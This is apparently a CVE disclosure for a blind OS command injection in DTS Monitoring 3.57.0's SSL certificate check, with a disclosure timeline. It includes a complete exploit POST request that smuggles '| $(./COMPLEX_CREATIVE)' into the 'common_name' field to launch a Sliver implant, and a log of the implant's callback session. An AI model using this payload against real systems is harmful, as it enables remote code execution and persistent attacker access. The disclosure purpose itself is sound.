# CVE-2023-33271

## Description

An issue was discovered in DTS Monitoring 3.57.0. The parameter `common_name` within the SSL Certificate check function is vulnerable to OS command injection (blind).

##### Vulnerability Type

> OS Command Injection

##### Attack Type

> Remote

##### Impact Code Execution

> True

---

## DTS Monitoring

The DTS Monitoring is a system monitoring solution which makes use of SNMP and custom checks via http(s) and tools like ping, telnet, netcat, wget, curl and many more to monitor system health based on thresholds or returned data.
The system is able to create alarms and sent sms as well as emails to inform IT staff about outages or high loads of resources of different kind.

https://www.dts.de/de/security-software-by-dts/loesungen-services/dts-monitoring

## Disclosure Timeline

- 12 May 2023 Initial Discovery
- 12 May 2023 Vulnerability Disclosure to DTS
- 12 May 2023 MITRE CVE Submission
- 13 May 2023 MTRE CVE Update: Vulnerabilities acknowledged by DTS Development Team

---

## POC Details

POST-Request exeucting Sliver-Malware binary `COMPLEX_CREATIVE` with command substitution `| $(./COMPLEX_CREATIVE)`.

```
POST /ajax.php HTTP/1.1
Host: ***********
Cookie: ***********
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/111.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: de,en-US;q=0.7,en;q=0.3
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
X-Requested-With: XMLHttpRequest
Content-Length: 928
Origin: https://***********
Referer: https://***********/index.php?i=m_hosts&mode=host&action=add&host_type=1
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Te: trailers
Connection: close

mode=monitoring&action=catch_check_data&sid=0&ip=192.168.1.1&c=&v=1&u=&pw=&a=MD5&s=authPriv&pp=AES&ppw=&mms=&ct=86&check_params=uniqueid%3D194dbe5cd7bec7d8%26checks%255B194dbe5cd7bec7d8%255D%255Bchecktype_id%255D%3D86%26mainfieldname%3Dchecks%255B194dbe5cd7bec7d8%255D%255Bcheck_params%255D%255Bcommon_name%255D%26checks%255B194dbe5cd7bec7d8%255D%255Bcheck_params%255D%255Bcommon_name%255D%3D192.168.1.1%257C%2B%2524(.%252FCOMPLEX_CREATIVE)%26checks%255B194dbe5cd7bec7d8%255D%255Bcheck_params%255D%255Bsni%255D%3D%26checks%255B194dbe5cd7bec7d8%255D%255Bcheck_params%255D%255Bport%255D%3D443%26checks%255B194dbe5cd7bec7d8%255D%255Bcheck_params%255D%255Bocsp%255D%3D0%26checks%255B194dbe5cd7bec7d8%255D%255Bcheck_params%255D%255Bverify%255D%3D0%26checks%255B194dbe5cd7bec7d8%255D%255Bcustom_short_name%255D%3Dssl%26checks%255B194dbe5cd7bec7d8%255D%255Bpreset_id%255D%3D86%26checks%255B194dbe5cd7bec7d8%255D%255Bpreset_name%255D%3D
```

##### Payload URL Decoded

Decoded POST-PAYLOAD for better readability.

```
mode=monitoring&action=catch_check_data&sid=0&ip=192.168.1.1&c=&v=1&u=&pw=&a=MD5&s=authPriv&pp=AES&ppw=&mms=&ct=86&check_params=uniqueid=194dbe5cd7bec7d8&checks[194dbe5cd7bec7d8][checktype_id]=86&mainfieldname=checks[194dbe5cd7bec7d8][check_params][common_name]&checks[194dbe5cd7bec7d8][check_params][common_name]=192.168.1.1| $(./COMPLEX_CREATIVE)&checks[194dbe5cd7bec7d8][check_params][sni]=&checks[194dbe5cd7bec7d8][check_params][port]=443&checks[194dbe5cd7bec7d8][check_params][ocsp]=0&checks[194dbe5cd7bec7d8][check_params][verify]=0&checks[194dbe5cd7bec7d8][custom_short_name]=ssl&checks[194dbe5cd7bec7d8][preset_id]=86&checks[194dbe5cd7bec7d8][preset_name]=
```

##### Sliver Implant Callback

```
[*] Session 30a0d023 COMPLEX_CREATIVE - ********:57950 (********.dts.de) - linux/amd64 - Fri, 12 May 2023 06:47:22 CEST
```
